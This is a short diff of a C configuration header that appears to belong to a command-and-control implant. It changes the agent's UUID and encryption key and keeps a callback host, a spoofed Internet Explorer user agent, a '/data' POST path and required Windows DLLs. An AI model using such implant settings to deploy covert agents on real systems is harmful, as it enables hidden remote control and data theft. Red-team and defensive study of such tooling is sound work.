@@ -8,8 +8,8 @@
 #define CONFIG_HOST L"192.168.0.134"
 #define CONFIG_UA L"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
 #define CONFIG_POST_URI L"/data"
-#define CONFIG_UUID "19a1f463-5389-4e0b-8ad3-9e626b81feae"
-#define CONFIG_ENCRYPT_KEY { 0xc0,0x51,0xb0,0xd3,0x98,0xd8,0x85,0x33,0x42,0x13,0xd3,0x4f,0x60,0x2d,0x93,0x34,0x82,0x2a,0x43,0x3a,0x26,0xf0,0x1a,0xef,0x3f,0xdf,0x39,0xd4,0x84,0x55,0x4f,0xf5 }
+#define CONFIG_UUID "311aafca-1b73-45d2-ac2d-71c31263db16"
+#define CONFIG_ENCRYPT_KEY { 245, 2, 183, 27, 24, 12, 93, 140, 124, 195, 36, 239, 248, 153, 211, 162, 204, 148, 127, 120, 146, 21, 13, 205, 219, 236, 53, 90, 152, 171, 79, 193 }
 #define REQUIRE_DLL_NTDLL
 #define REQUIRE_DLL_KERNEL32
 #define REQUIRE_DLL_WININET
